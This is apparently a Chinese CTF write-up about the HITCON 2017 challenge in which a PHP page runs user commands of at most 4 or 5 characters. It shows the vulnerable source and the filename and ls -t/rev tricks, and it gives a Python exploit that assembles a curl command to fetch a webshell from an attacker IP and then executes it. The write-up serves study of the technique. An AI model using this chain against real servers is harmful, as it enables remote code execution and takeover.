---
title: 绕过4-5个字符限制getshell
date: 2020-06-02
image: 
description: 由一道CTF题目探究绕过4，	5个字符限制getshell
categories: 
- note
tags:
- RCE bypass
---
这个东西起源于HITCON CTF 2017的一道题，高校战疫Hack Me也曾经出现过，最近突然做到了来说一下

参考：https://www.anquanke.com/post/id/87203

------

### 源码

五字版本

```
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 5) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

四字版本：

```
<?php
    $sandbox = '/www/sandbox/' . md5("orange" . $_SERVER['REMOTE_ADDR']);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET['cmd']) && strlen($_GET['cmd']) <= 4) {
        @exec($_GET['cmd']);
    } else if (isset($_GET['reset'])) {
        @exec('/bin/rm -rf ' . $sandbox);
    }
    highlight_file(__FILE__);
```

### 预备知识

在cmd长度小于5（4）个字符的时候用 `exec` 函数执行系统命令，不过 `exec` 函数是默认没有回显的，这里我们就只能盲打。

#### Linux用\连接多行命令

Linux系统中支持用 `\` 字符来分割一个多行命令，在一个文件中即使有无法识别的命令，报错，也不会影响其他正常命令执行

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170817.png)

#### 用两个字符在Linux下创建文件

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170833.png)

#### ls的文件排序和ls -t的文件排序

ls

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170844.png)

ls -t

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170853.png)

可以看到， `ls` 是按照alphabet来排序的， `ls -t` 是按照创建时间的顺序来排序的

 

### 分析

我们在原文可以看到，作者通过了创建文件，利用文件名构造curl命令，然后用ls命令追加到一个文件，再用sh命令去执行它

思路显然是非常的爆炸，但是我经过复现之后，发现这种构造很困难，作者利用了IP的16进制、8进制和长整型形式来构造文件名，而且分割之后恰恰又是满足alphabet的，而VPS的ip是固定不变的，想要找一个这样的IP需要一定的巧合。

并且原作者playload的到数第三行：

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170902.png)

利用了A文件本身就在ls命令回显的特性，我构造到这里，很难受，这个技巧太高。

#### ls -t 、 rev 、 * 命令结合使用回避alphabet

而在HITCON2017的四字版本里面，有师傅利用 `ls -t` 和 `rev` 和 `*` 避开了这个问题，不过思路也是相当的巧妙

```
import requests
import time

host = '127.0.0.1'

playload = [
 # generate "g> ht- sl" to file "v"
    '>dir',
    '>g\>',
    '>ht-',
    '>sl',
    '*>v',
 # reverse file "v" to file "h", content "ls -th >g"
    '>rev',
    '*v>h',
  # generate "curl 59.xx0.x5x.4>p.php"
    '>\;\\',
    '>p',
    '>ph\\',
    '>p.\\',
    '>\>\\',
    '>4\\',
    '>5x.\\',
    '>0.x\\',
    '>xx\\',
    '>59.\\',
    '>\ \\',
    '>rl\\',
    '>cu\\',
    'sh h',
    'sh g',
]

for i in playload:
    cmd = i
    r = requests.get(host + '?cmd=' + i)
    #print(r.text)
    time.sleep(0.2)
```

这是5字版本的exp，4字版本只需要改一下自己的IP。

其中 `*` 这个命令很有意思

![img](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170912.png)

所以这个方案明显比原来的利用alphabet的排序来写shell好多了